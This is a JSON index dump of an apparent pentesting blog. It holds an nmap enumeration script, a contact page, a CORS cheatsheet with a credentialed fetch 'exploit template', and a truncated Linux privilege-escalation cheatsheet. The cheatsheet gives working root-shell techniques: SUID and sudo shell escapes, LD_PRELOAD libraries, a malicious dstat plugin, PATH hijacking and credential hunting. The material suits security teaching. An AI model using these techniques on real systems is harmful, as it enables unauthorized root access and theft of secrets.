-sn \u003cspan class=\"nv\"\u003e$TARGET\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Port scan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;[+] Port scanning...\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sS -sV -sC -O -A \u003cspan class=\"nv\"\u003e$TARGET\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# HTTP enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;[+] HTTP enumeration...\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://\u003cspan class=\"nv\"\u003e$TARGET\u003c/span\u003e -w /usr/share/wordlists/dirb/common.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SSH enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;[+] SSH enumeration...\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-keyscan -t rsa,dsa,ecdsa,ed25519 \u003cspan class=\"nv\"\u003e$TARGET\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Enumeration complete!\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"best-practices\"\u003eBest Practices\u003c/h2\u003e\n\u003ch3 id=\"1-stealth-scanning\"\u003e1. Stealth Scanning\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUse \u003ccode\u003e-sS\u003c/code\u003e for SYN scans\u003c/li\u003e\n\u003cli\u003eAdjust timing with \u003ccode\u003e-T\u003c/code\u003e options\u003c/li\u003e\n\u003cli\u003eUse decoy scans when needed\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"2-service-identification\"\u003e2. Service Identification\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAlways use \u003ccode\u003e-sV\u003c/code\u003e for version detection\u003c/li\u003e\n\u003cli\u003eCombine with \u003ccode\u003e-sC\u003c/code\u003e for default scripts\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003e-A\u003c/code\u003e for aggressive scanning\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"3-documentation\"\u003e3. Documentation\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eSave all output to files\u003c/li\u003e\n\u003cli\u003eUse timestamps in filenames\u003c/li\u003e\n\u003cli\u003eDocument findings systematically\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"conclusion\"\u003eConclusion\u003c/h2\u003e\n\u003cp\u003eNetwork enumeration is a crucial phase in penetration testing and security assessments. These techniques provide a solid foundation for discovering and mapping network infrastructure.\u003c/p\u003e","title":"Network Enumeration Techniques"},{"content":"Get in Touch I\u0026rsquo;d love to connect with fellow cybersecurity professionals, enthusiasts, and anyone interested in security research! Whether you have questions about techniques, want to discuss security topics, or collaborate on projects, feel free to reach out.\nüìß Email Subscription Stay updated with the latest cybersecurity insights, tutorials, and security research directly in your inbox!\nSubscribe to My Newsletter üìù\rWeekly Security Insights\rGet exclusive cybersecurity content:\n‚Ä¢ Weekly security insights and tutorials\n‚Ä¢ Latest vulnerability research \u0026 defensive techniques\n‚Ä¢ Exclusive content and early access to new posts\nüì¨\rSubscribe on Substack\rJoin the community:\nüìß Subscribe Now\rüåê Connect on Social Media Professional Networks LinkedIn\rProfessional Networking\nConnect for career opportunities, professional discussions, and industry insights.\n@dream4ip ‚Üí\rGitHub\rCode Repository\nExplore my security tools, research projects, and open-source contributions.\n@realspaceeagle ‚Üí\rMedium\rTechnical Articles\nRead my in-depth security articles and research publications.\n@haranloga95 ‚Üí\rTwitter/X\rSecurity Updates\nFollow for real-time security news, threat alerts, and community discussions.\n@haran_loga ‚Üí\rüì¨ Direct Email For direct communication:\nüìß\rPrimary Email\rDirect Communication\nFor general inquiries, collaboration requests, and professional discussions.\naraharan.x.loganayagam@hotmail.com\rüîê\rSecure Communication\rPGP Encryption Available\nFor sensitive security discussions and vulnerability reports.\ngpg --keyserver keyserver.ubuntu.com\n--search-keys araharan\rü§ù What I\u0026rsquo;m Interested In I\u0026rsquo;m always open to discussing:\nTechnical Discussions üéØ\rPenetration Testing\rExpertise Areas:\n‚Ä¢ Web Application Security\n‚Ä¢ Network Enumeration\n‚Ä¢ Active Directory Attacks\n‚òÅÔ∏è\rCloud Security\rSpecializations:\n‚Ä¢ AWS Security Architecture\n‚Ä¢ Container Security\n‚Ä¢ DevSecOps Implementation\nüî¨\rResearch Topics\rCurrent Focus:\n‚Ä¢ Vulnerability Research\n‚Ä¢ Threat Intelligence\n‚Ä¢ Malware Analysis\nCollaboration Opportunities ü§ù\rResearch \u0026 Content\r‚Ä¢ Security Research Collaboration\n‚Ä¢ Technical Reviews \u0026 Code Analysis\n‚Ä¢ Guest Content for Publications\n‚Ä¢ Speaking at Conferences \u0026 Meetups\nüéì\rEducation \u0026 Community\r‚Ä¢ Mentorship for Newcomers\n‚Ä¢ Security Awareness Initiatives\n‚Ä¢ Training \u0026 Workshop Development\n‚Ä¢ Community Building Activities\nüíº\rProfessional Services\r‚Ä¢ Security Consulting \u0026 Assessments\n‚Ä¢ Technical Writing \u0026 Documentation\n‚Ä¢ Open Source Contributions\n‚Ä¢ Cybersecurity Education\n‚è±Ô∏è Response Time üí¨\rGeneral Inquiries\r24-48 hours\nGeneral questions, introductions, and basic discussions.\nüîß\rTechnical Questions\r1-3 days\nIn-depth technical discussions and detailed problem solving.\nü§ù\rCollaboration Requests\r3-5 days\nProject collaborations and partnership proposals.\nüö®\rUrgent Security Matters\rSame day\nVulnerability reports and critical security issues.\nüìß Priority Handling: For urgent security matters or vulnerability reports, please mention \"URGENT\" or \"SECURITY\" in your subject line.\nüîí Security \u0026amp; Privacy Secure Communication üîê\rPGP Encryption\rAvailable upon request\nFor sensitive security discussions and vulnerability reports requiring end-to-end encryption.\nüì±\rSignal Messenger\rReal-time secure chat\nFor urgent communications and real-time collaboration on security matters.\nüõ°Ô∏è\rProtonMail\rEnhanced privacy\nAvailable on request for maximum privacy and security in sensitive communications.\nResponsible Disclosure If you need to report a security vulnerability:\nDO NOT post publicly initially Contact me directly with \u0026ldquo;VULNERABILITY REPORT\u0026rdquo; in subject Include detailed technical information Allow 90 days for coordinated disclosure üìç Location \u0026amp; Availability Based in: London, United Kingdom üá¨üáß\nTime Zone: GMT/BST\nAvailable for: Remote consultations, virtual meetings, and UK-based in-person discussions\nLooking forward to connecting with you and building a stronger cybersecurity community together!\n# Thank you for visiting $ echo \u0026#34;Stay secure, stay curious!\u0026#34; $ echo \u0026#34;Remember: Security is a journey, not a destination\u0026#34; ","permalink":"https://realspaceeagle.github.io/contact/","summary":"\u003ch1 id=\"get-in-touch\"\u003eGet in Touch\u003c/h1\u003e\n\u003cp\u003eI\u0026rsquo;d love to connect with fellow cybersecurity professionals, enthusiasts, and anyone interested in security research! Whether you have questions about techniques, want to discuss security topics, or collaborate on projects, feel free to reach out.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-email-subscription\"\u003eüìß Email Subscription\u003c/h2\u003e\n\u003cp\u003eStay updated with the latest cybersecurity insights, tutorials, and security research directly in your inbox!\u003c/p\u003e\n\u003ch3 id=\"subscribe-to-my-newsletter\"\u003eSubscribe to My Newsletter\u003c/h3\u003e\n\u003cdiv style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin: 20px 0;\"\u003e\r\n\u003cdiv style=\"border: 2px solid #40c057; border-radius: 12px; padding: 20px; background: linear-gradient(135deg, #0a0a0a, #1a1a1a); box-shadow: 0 4px 15px rgba(64, 192, 87, 0.2); transition: transform 0.3s ease;\"\u003e\r\n\u003cdiv style=\"font-size: 24px; margin-bottom: 10px;\"\u003eüìù\u003c/div\u003e\r\n\u003ch4 style=\"color: #40c057; margin-bottom: 15px;\"\u003eWeekly Security Insights\u003c/h4\u003e\r\n\u003cp style=\"color: #cccccc; font-size: 14px; margin-bottom: 8px;\"\u003e\u003cstrong\u003eGet exclusive cybersecurity content:\u003c/strong\u003e\u003c/p\u003e","title":"Contact"},{"content":"CORS Cheatsheet Evaluation Checklist Inspect all Access-Control-* headers in the response. Map the origin reflection rules (Access-Control-Allow-Origin). Check whether credentials are allowed (Access-Control-Allow-Credentials: true). Test both simple and preflighted requests. Record browser console output for rejected preflights. Common Misconfigurations Pattern Risk Access-Control-Allow-Origin: * with credentials allowed Full privilege leakage Origin reflection using Origin: https://subdomain.attacker.com Arbitrary origin escalation Access-Control-Allow-Headers: * Arbitrary header injection Missing Vary: Origin Cache poisoning Simple Exploit Template fetch(\u0026#39;https://target.app/api/profile\u0026#39;, { credentials: \u0026#39;include\u0026#39; }) .then(res =\u0026gt; res.text()) .then(console.log); Preflight Control fetch(\u0026#39;https://target.app/api/update\u0026#39;, { method: \u0026#39;POST\u0026#39;, credentials: \u0026#39;include\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;X-Api-Version\u0026#39;: \u0026#39;2\u0026#39; }, body: JSON.stringify({ plan: \u0026#39;pro\u0026#39; }) }); Testing Tips For wildcard origins, send Origin: https://evil.test. Validate response headers for each interesting endpoint (REST, GraphQL, legacy). Leverage the browser devtools network inspector to capture preflight failures. Use curl with -H \u0026quot;Origin:\u0026quot; to reproduce outside the browser. Secure Defaults Explicitly list allowed origins. Only allow credentials when required and limit to trusted origins. Restrict methods to the minimal set (GET, POST, etc.). Restrict headers to required custom headers only. Ensure sensitive endpoints require server-side authorization beyond CORS. Coordinate findings with application owners: CORS is an access control layer, not a standalone security control.\n","permalink":"https://realspaceeagle.github.io/cheatsheets/cors/","summary":"\u003ch1 id=\"cors-cheatsheet\"\u003eCORS Cheatsheet\u003c/h1\u003e\n\u003ch2 id=\"evaluation-checklist\"\u003eEvaluation Checklist\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eInspect all \u003ccode\u003eAccess-Control-*\u003c/code\u003e headers in the response.\u003c/li\u003e\n\u003cli\u003eMap the origin reflection rules (\u003ccode\u003eAccess-Control-Allow-Origin\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eCheck whether credentials are allowed (\u003ccode\u003eAccess-Control-Allow-Credentials: true\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eTest both simple and preflighted requests.\u003c/li\u003e\n\u003cli\u003eRecord browser console output for rejected preflights.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"common-misconfigurations\"\u003eCommon Misconfigurations\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003ePattern\u003c/th\u003e\n          \u003cth\u003eRisk\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eAccess-Control-Allow-Origin: *\u003c/code\u003e with credentials allowed\u003c/td\u003e\n          \u003ctd\u003eFull privilege leakage\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eOrigin reflection using \u003ccode\u003eOrigin: https://subdomain.attacker.com\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eArbitrary origin escalation\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eAccess-Control-Allow-Headers: *\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eArbitrary header injection\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eMissing \u003ccode\u003eVary: Origin\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eCache poisoning\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"simple-exploit-template\"\u003eSimple Exploit Template\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003efetch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;https://target.app/api/profile\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nx\"\u003ecredentials\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;include\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ethen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eres\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"nx\"\u003eres\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ethen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"preflight-control\"\u003ePreflight Control\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003efetch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;https://target.app/api/update\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nx\"\u003emethod\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nx\"\u003ecredentials\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;include\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nx\"\u003eheaders\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;application/json\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s1\"\u003e\u0026#39;X-Api-Version\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;2\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e \u003cspan class=\"nx\"\u003eplan\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;pro\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"testing-tips\"\u003eTesting Tips\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eFor wildcard origins, send \u003ccode\u003eOrigin: https://evil.test\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eValidate response headers for each interesting endpoint (REST, GraphQL, legacy).\u003c/li\u003e\n\u003cli\u003eLeverage the browser devtools network inspector to capture preflight failures.\u003c/li\u003e\n\u003cli\u003eUse curl with \u003ccode\u003e-H \u0026quot;Origin:\u0026quot;\u003c/code\u003e to reproduce outside the browser.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"secure-defaults\"\u003eSecure Defaults\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eExplicitly list allowed origins.\u003c/li\u003e\n\u003cli\u003eOnly allow credentials when required and limit to trusted origins.\u003c/li\u003e\n\u003cli\u003eRestrict methods to the minimal set (\u003ccode\u003eGET\u003c/code\u003e, \u003ccode\u003ePOST\u003c/code\u003e, etc.).\u003c/li\u003e\n\u003cli\u003eRestrict headers to required custom headers only.\u003c/li\u003e\n\u003cli\u003eEnsure sensitive endpoints require server-side authorization beyond CORS.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cem\u003eCoordinate findings with application owners: CORS is an access control layer, not a standalone security control.\u003c/em\u003e\u003c/p\u003e","title":"CORS Cheatsheet"},{"content":"Linux Privilege Escalation Cheatsheet Initial Enumeration System Information # Basic system info uname -a cat /etc/os-release cat /etc/issue hostname # Current user context id whoami groups cat /etc/passwd | grep sh # Environment variables env printenv echo $PATH User and Group Enumeration # List all users cat /etc/passwd # Users with login shells cat /etc/passwd | grep sh # Current user privileges sudo -l find / -user $(whoami) 2\u0026gt;/dev/null | grep -v \u0026#39;^/proc\\|^/run\\|^/sys\u0026#39; find / -group $(whoami) 2\u0026gt;/dev/null | grep -v \u0026#39;^/proc\\|^/run\\|^/sys\u0026#39; # Check for interesting group memberships groups id # Find files owned by current user find / -user $(id -u) 2\u0026gt;/dev/null find / -group $(id -g) 2\u0026gt;/dev/null SUID and SGID Analysis Finding SUID/SGID Binaries # Find SUID binaries find / -perm -u=s -type f 2\u0026gt;/dev/null find / -perm -4000 -type f 2\u0026gt;/dev/null # Find SGID binaries find / -perm -g=s -type f 2\u0026gt;/dev/null find / -perm -2000 -type f 2\u0026gt;/dev/null # Find both SUID and SGID find / -perm -u=s -o -perm -g=s -type f 2\u0026gt;/dev/null # Common SUID binaries to check ls -la /usr/bin/passwd ls -la /usr/bin/sudo ls -la /usr/bin/su ls -la /usr/local/bin/doas GTFOBins Exploitation # Check GTFOBins for binary exploitation # https://gtfobins.github.io/ # Common exploitable SUID binaries: # - /usr/bin/find find . -exec /bin/sh -p \\; -quit # - /usr/bin/vim vim -c \u0026#39;:!/bin/sh\u0026#39; # - /usr/bin/less less /etc/profile !/bin/sh # - /usr/bin/more more /etc/profile !/bin/sh # - /usr/bin/nmap (older versions) nmap --interactive !sh # - /usr/bin/awk awk \u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39; doas Privilege Escalation doas Configuration Analysis # Find doas binary and configuration find / -name doas 2\u0026gt;/dev/null find / -name doas.conf 2\u0026gt;/dev/null # Common doas locations ls -la /usr/local/bin/doas ls -la /usr/local/etc/doas.conf # Check doas configuration cat /usr/local/etc/doas.conf # Example vulnerable configuration: # permit nopass player as root cmd /usr/bin/dstat doas Exploitation Techniques # Basic doas command execution doas /usr/bin/dstat # Check what commands are allowed doas -n /usr/bin/dstat --help # If specific command is allowed, look for ways to abuse it # Example: dstat with custom plugins # doas with dstat privilege escalation # 1. Check if you can write to dstat plugin directory find / -group $(id -g) 2\u0026gt;/dev/null | grep dstat ls -la /usr/local/share/dstat # 2. Create malicious dstat plugin echo \u0026#39;import os; os.execv(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;sh\u0026#34;])\u0026#39; \u0026gt; /usr/local/share/dstat/dstat_exploit.py # 3. Execute with doas doas /usr/bin/dstat --exploit doas vs sudo Differences # doas syntax doas command # doas with specific user doas -u root command # Check doas configuration syntax # permit [options] identity [as target] [cmd command [args ...]] # Common doas misconfigurations: # - permit nopass user as root cmd /path/to/binary # - Allowing commands that can spawn shells # - Wildcard permissions sudo Privilege Escalation sudo Enumeration # Check sudo privileges sudo -l # Check sudo version sudo --version # Common sudo misconfigurations: # - NOPASSWD entries # - Wildcard permissions # - Commands that allow shell escapes sudo Exploitation Examples # sudo with shell escape commands sudo vim :!/bin/bash sudo less /etc/profile !/bin/bash sudo find /etc -name \u0026#34;*.conf\u0026#34; -exec /bin/bash \\; # sudo with environment variables sudo -E /bin/bash # sudo with LD_PRELOAD echo \u0026#39;int main() { setgid(0); setuid(0); system(\u0026#34;/bin/bash\u0026#34;); return 0; }\u0026#39; \u0026gt; /tmp/exploit.c gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles sudo LD_PRELOAD=/tmp/exploit.so /bin/bash # sudo with LD_LIBRARY_PATH mkdir /tmp/lib echo \u0026#39;int main() { setgid(0); setuid(0); system(\u0026#34;/bin/bash\u0026#34;); return 0; }\u0026#39; \u0026gt; /tmp/lib/exploit.c gcc -fPIC -shared -o /tmp/lib/libc.so.6 /tmp/lib/exploit.c sudo LD_LIBRARY_PATH=/tmp/lib /bin/bash Writable Directory Exploitation Finding Writable Directories # Find world-writable directories find / -type d -perm -002 2\u0026gt;/dev/null # Find directories writable by current user find / -type d -writable 2\u0026gt;/dev/null # Find directories owned by current user find / -type d -user $(whoami) 2\u0026gt;/dev/null # Common locations to check ls -la /tmp ls -la /var/tmp ls -la /dev/shm ls -la /usr/local/share PATH Manipulation # Check current PATH echo $PATH # Create malicious binary in writable directory echo \u0026#39;#!/bin/bash\\n/bin/bash -p\u0026#39; \u0026gt; /tmp/ls chmod +x /tmp/ls # Modify PATH to prioritize malicious binary export PATH=/tmp:$PATH # Wait for privileged process to execute our binary # Or trigger execution through cron jobs, scripts, etc. Library Hijacking # Check for writable library directories find / -type d -writable 2\u0026gt;/dev/null | grep -E \u0026#34;(lib|lib64)\u0026#34; # Check LD_LIBRARY_PATH in processes ps aux | grep -i ld_library # Create malicious shared library echo \u0026#39;void _init() { setgid(0); setuid(0); system(\u0026#34;/bin/bash\u0026#34;); }\u0026#39; \u0026gt; /tmp/exploit.c gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles # Place in writable library directory cp /tmp/exploit.so /writable/lib/directory/ Process and Service Analysis Running Processes # List all processes ps aux ps -ef --forest # Processes running as root ps aux | grep root # Network connections ss -tlnp netstat -tulnp # Check for processes with interesting capabilities /sbin/getcap -r / 2\u0026gt;/dev/null Cron Jobs and Scheduled Tasks # System cron jobs cat /etc/crontab ls -la /etc/cron.* crontab -l # User cron jobs crontab -l cat /var/spool/cron/crontabs/* # Systemd timers systemctl list-timers find /etc/systemd -name \u0026#34;*.timer\u0026#34; Services and Sockets # Running services systemctl list-units --type=service --state=running # Check service files for misconfigurations find /etc/systemd -name \u0026#34;*.service\u0026#34; -exec grep -l \u0026#34;User\\|Group\u0026#34; {} \\; # Socket files systemctl list-units --type=socket find /etc/systemd -name \u0026#34;*.socket\u0026#34; File System Analysis Configuration Files # Check for readable sensitive files find /etc -readable -type f 2\u0026gt;/dev/null | head -20 # Database configuration files find / -name \u0026#34;*.conf\u0026#34; -o -name \u0026#34;*.config\u0026#34; -o -name \u0026#34;*.cfg\u0026#34; 2\u0026gt;/dev/null | grep -E \u0026#34;(sql|db|database)\u0026#34; # Web application configs find / -name \u0026#34;wp-config.php\u0026#34; -o -name \u0026#34;config.php\u0026#34; -o -name \u0026#34;.env\u0026#34; 2\u0026gt;/dev/null # SSH keys and certificates find / -name \u0026#34;id_rsa\u0026#34; -o -name \u0026#34;id_dsa\u0026#34; -o -name \u0026#34;*.pem\u0026#34; -o -name \u0026#34;*.key\u0026#34; 2\u0026gt;/dev/null Log Files # System logs find /var/log -readable -type f 2\u0026gt;/dev/null # Application logs find / -name \u0026#34;*.log\u0026#34; -readable 2\u0026gt;/dev/null | head -10 # Check logs for passwords or sensitive information grep -r -i \u0026#34;password\\|passwd\\|secret\\|token\u0026#34; /var/log/ 2\u0026gt;/dev/null Backup Files # Find backup files find / -name \u0026#34;*.bak\u0026#34; -o -name \u0026#34;*.backup\u0026#34; -o -name \u0026#34;*.old\u0026#34; -o -name \u0026#34;*~\u0026#34; 2\u0026gt;/dev/null # Database backups find / -name \u0026#34;*.sql\u0026#34; -o -name \u0026#34;*.dump\u0026#34; -o -name \u0026#34;*.db\u0026#34; 2\u0026gt;/dev/null # Configuration backups find /etc -name \u0026#34;*.bak\u0026#34; -o -name \u0026#34;*.old\u0026#34; -o -name \u0026#34;*.orig\u0026#34; 2\u0026gt;/dev/null Application-Specific Exploits dstat Plugin Exploitation # Check dstat plugin directories find / -name \u0026#34;*dstat*\u0026#34; -type d 2\u0026gt;/dev/null ls -la /usr/share/dstat ls -la /usr/local/share/dstat # Check permissions on plugin directory ls -la /usr/local/share/dstat # Create malicious dstat plugin cat \u0026gt; /usr/local/share/dstat/dstat_exploit.py \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; import os os.execv(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;sh\u0026#34;]) EOF # Execute with doas/sudo doas /usr/bin/dstat --exploit Python Library Hijacking # Check Python path python -c \u0026#34;import sys; print(\u0026#39;\\n\u0026#39;.join(sys.path))\u0026#34; # Find writable Python directories python -c \u0026#34;import sys; print(\u0026#39;\\n\u0026#39;.join([p for p in sys.path if __import__(\u0026#39;os\u0026#39;).access(p, __import__(\u0026#39;os\u0026#39;).W_OK)]))\u0026#34; # Create malicious module echo \u0026#39;import os; os.execv(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;sh\u0026#34;])\u0026#39; \u0026gt; /writable/python/path/exploit.py # Import in vulnerable application python -c \u0026#34;import exploit\u0026#34; Binary Wrapper Exploitation # Create wrapper script for allowed commands cat \u0026gt; /tmp/malicious_script \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; #!/bin/bash /bin/bash -p EOF chmod +x /tmp/malicious_script # If PATH 